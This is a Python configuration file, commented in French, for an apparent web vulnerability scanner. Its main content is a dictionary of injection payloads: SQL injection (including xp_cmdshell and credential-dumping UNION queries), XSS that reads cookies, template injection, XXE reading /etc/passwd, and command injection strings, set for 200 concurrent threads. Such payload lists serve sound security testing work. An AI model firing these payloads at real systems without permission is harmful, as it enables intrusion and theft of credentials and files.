import os

# Définition du chemin racine du projet
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Chemin vers SecLists (fuzzing payloads)
SECLISTS_PATH = os.path.join(BASE_DIR, "SecLists", "Fuzzing")

# Chemin vers le dossier des rapports
REPORTS_DIR = os.path.join(BASE_DIR, "reports")

# ✅ Définition correcte du dictionnaire avant utilisation
INJECTIONS = {
    "SQL": [
        "' OR '1'='1' --",
        "' UNION SELECT username, password FROM users --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "'; EXEC xp_cmdshell('whoami') --",
        "1' AND SLEEP(5) --",
        "1' OR 1=1 --",
        "' OR 'a'='a"
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('Hacked')>",
        "';alert('XSS');//",
        "javascript:alert('XSS')",
        "onmouseover=alert(document.cookie)",
        "<script>document.write('<h1>HACKED</h1>')</script>",
        "\";alert('XSS');//"
    ],
    "HTML": [
        "{{7*7}}",
        "{% print('Hacked') %}",
        "<%= 7 * 7 %>",
        "${7*7}",
        "#{7*7}",
        "{{7+7}}"
    ],
    "XML": [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>"
    ],
    "Command": [
        "; ls -la",
        "& cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(uname -a)"
    ]
}


# Création automatique des dossiers manquants
os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(SECLISTS_PATH, exist_ok=True)

# Configuration du scanner
MAX_THREADS = 200  # 🔥 Augmente le nombre de requêtes simultanées
TIMEOUT = 1  # Réduit le timeout pour accélérer le scan

print(f"✅ Configuration chargée : {BASE_DIR}")
